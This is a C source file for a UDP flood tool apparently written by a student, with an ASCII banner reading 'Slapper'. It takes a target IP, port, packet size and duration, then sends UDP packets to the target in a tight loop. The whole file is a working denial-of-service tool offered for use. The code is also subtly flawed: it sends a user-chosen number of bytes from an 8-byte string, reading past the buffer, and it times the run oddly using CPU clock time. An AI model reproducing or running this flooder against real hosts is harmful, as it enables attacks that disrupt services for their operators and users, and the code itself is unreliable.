/*
** my_udp.c for achille's udp flood tool in /home/binary/All/Enjoy
** 
** Made by **r**e Achille
** Login   <binary@epitech.net>
** 
** Started on  Sun May 28 18:22:10 2017
** Last update Sun May 28 20:55:36 2017 Laroche Achille
*/

#include <stdio.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>

#define SEND		"NO MERCY"

int			motd()
{
  printf("  _________.__                                     \n");
  printf(" /   _____/|  | _____  ______ ______   ___________ \n");
  printf(" \\_____  \\ |  | \\__  \\ \\____ \\\\____ \\_/ __ \\_  __ \\\n");
  printf(" /        \\|  |__/ __ \\|  |_> >  |_> >  ___/|  | \\/\n");
  printf("/_______  /|____(____  /   __/|   __/ \\___  >__|   \n");
  printf("        \\/           \\/|__|   |__|        \\/v1\n");
  return (1);
}

void			handler(int err)
{
  if (err == -2)
    printf("Bad argument!\nExemple: 1.2.3.4 80 65500 60\n");
  else if (err == -1)
    printf("Ip is unreachable sorry..\n");
  if (err == 0 || err == -2)
    printf("Usage: ./name [ip] [port] [packet size (max:1000)] [time]\n");
  exit(EXIT_FAILURE);
}

int			connection(char *host, uint16_t port)
{
  struct sockaddr_in	udp;
  struct hostent	*bbs;
  int			socks;

  if (!(bbs = gethostbyname(host)))
    handler(-1);
  bzero((char*) &udp, sizeof(udp));
  bcopy(bbs->h_addr, (char *) &udp.sin_addr, bbs->h_length);
  udp.sin_family = bbs->h_addrtype;
  udp.sin_port = htons(port);
  socks = socket(AF_INET, SOCK_DGRAM, 0);
  connect(socks, (struct sockaddr *) &udp, sizeof(udp));
  return (socks);
}

int			main(int ac, char **av)
{
  int			target;
  clock_t		start = clock();

  if (ac != 5 || motd() != 1)
    handler(0);
  for (int xx = 1; xx < ac; xx++)
    for (int x = 0; av[xx][x]; x++)
      if ((av[xx][x] < '0' && av[xx][x] != '.') || av[xx][x] > '9')
        handler(-2);
  printf("Sending packets of %so to %s:%s for %ss\n~\n", av[3], av[1], av[2], av[4]);
  target = connection(av[1], atoi(av[2]));
  while ((clock() - start) / CLOCKS_PER_SEC < atoi(av[4]) / 8)
    send(target, SEND, atoi(av[3]), 0);
  printf("made by achille\n");
  return (0);
}
